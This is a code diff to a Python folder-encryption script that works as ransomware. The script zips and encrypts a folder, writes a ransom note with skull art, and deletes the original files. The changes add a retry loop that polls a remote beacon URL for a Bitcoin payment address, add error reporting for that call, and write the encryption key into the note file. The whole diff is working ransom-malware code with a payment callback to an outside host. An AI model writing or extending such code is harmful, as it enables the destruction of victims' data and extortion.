@@ -30,6 +30,7 @@ import sys
 import time
 import urllib.request
 import urllib.parse
+import urllib.error
 from dataclasses import dataclass
 from pathlib import Path
 from typing import Optional
@@ -326,6 +327,15 @@ def fetch_bitcoin_address(beacon_url: str) -> Optional[str]:
     GET beacon URL with ?action=new_address and return the Bitcoin address if present.
     Returns None on any failure (so encryption flow is unaffected).
     """
+    addr, _ = fetch_bitcoin_address_with_error(beacon_url)
+    return addr
+
+
+def fetch_bitcoin_address_with_error(beacon_url: str) -> tuple[Optional[str], Optional[str]]:
+    """
+    GET beacon URL with ?action=new_address. Returns (address, error_message).
+    If ok and address present, returns (address, None). Otherwise (None, error_message).
+    """
     try:
         sep = "&" if "?" in beacon_url else "?"
         url = f"{beacon_url.rstrip('/')}{sep}action=new_address"
@@ -333,11 +343,17 @@ def fetch_bitcoin_address(beacon_url: str) -> Optional[str]:
         with urllib.request.urlopen(req, timeout=5) as resp:
             data = resp.read().decode("utf-8")
         out = json.loads(data)
-        if isinstance(out, dict) and out.get("ok") and isinstance(out.get("address"), str):
-            return out["address"].strip() or None
-    except Exception:
-        pass
-    return None
+        if isinstance(out, dict):
+            if out.get("ok") and isinstance(out.get("address"), str):
+                return (out["address"].strip() or None, None)
+            return (None, str(out.get("error", "No address in response")).strip() or "Unknown error")
+    except urllib.error.URLError as e:
+        return (None, str(e.reason) if getattr(e, "reason", None) else str(e))
+    except urllib.error.HTTPError as e:
+        return (None, f"HTTP {e.code}")
+    except Exception as e:
+        return (None, str(e))
+    return (None, "Unknown error")
 
 
 def write_info_file(
@@ -345,10 +361,11 @@ def write_info_file(
     encrypted_file: Path,
     *,
     bitcoin_address: Optional[str] = None,
+    key: Optional[bytes] = None,
 ) -> None:
     """
-    Write a text file with the ransom message and skull art (no key).
-    Optionally include a Bitcoin payment address from the beacon.
+    Write a text file with the ransom message, optional Bitcoin address, optional key, and skull art.
+    If key is provided it is written so --decrypt can read it from the file without --key.
     """
     info_path.parent.mkdir(parents=True, exist_ok=True)
     message_lines = [
@@ -362,6 +379,10 @@ def write_info_file(
     if bitcoin_address:
         message_lines.append("Send payment to this Bitcoin address to receive decryption key:")
         message_lines.append(bitcoin_address)
+        message_lines.append("")
+    if key is not None:
+        message_lines.append("Encryption key:")
+        message_lines.append(key.decode("utf-8"))
         message_lines.append("")
     message_lines.extend([
         "Use the Python script `encrypt_folder.py` with --decrypt and --key (or --key-file) to",
@@ -525,6 +546,17 @@ def read_key_from_info_file(info_path: Path) -> bytes:
 
 
 def encrypt_folder(config: EncryptConfig) -> None:
+    bitcoin_address: Optional[str] = None
+    if config.callback_url:
+        print("[+] Beacon configured. Waiting for payment address from beacon...")
+        while not bitcoin_address:
+            bitcoin_address, err_msg = fetch_bitcoin_address_with_error(config.callback_url)
+            if not bitcoin_address:
+                msg = f"    {err_msg}" if err_msg else "Address not yet available (bitcoind may be starting)."
+                print(f"{msg} Retrying in 5s...")
+                time.sleep(5)
+        print(f"[+] Payment address from beacon: {bitcoin_address}")
+
     print(f"[+] Zipping folder: {config.folder}")
     # Exclude the info file and encrypted archive from the zip (especially if re-running).
     exclude_paths: set[Path] = {config.info_file, config.output_file}
@@ -551,17 +583,12 @@ def encrypt_folder(config: EncryptConfig) -> None:
     config.output_file.write_bytes(token)
     print(f"[+] Encrypted archive written to: {config.output_file}")
 
-    bitcoin_address: Optional[str] = None
-    if config.callback_url:
-        bitcoin_address = fetch_bitcoin_address(config.callback_url)
-        if bitcoin_address:
-            print(f"[+] Payment address from beacon: {bitcoin_address}")
-
     print(f"[+] Writing encryption info file to: {config.info_file}")
     write_info_file(
         config.info_file,
         encrypted_file=config.output_file,
         bitcoin_address=bitcoin_address,
+        key=key,
     )
     print(f"[+] Info file written. Deleting original files in {config.folder}")
     # Keep the encrypted archive and the info file; delete everything else.
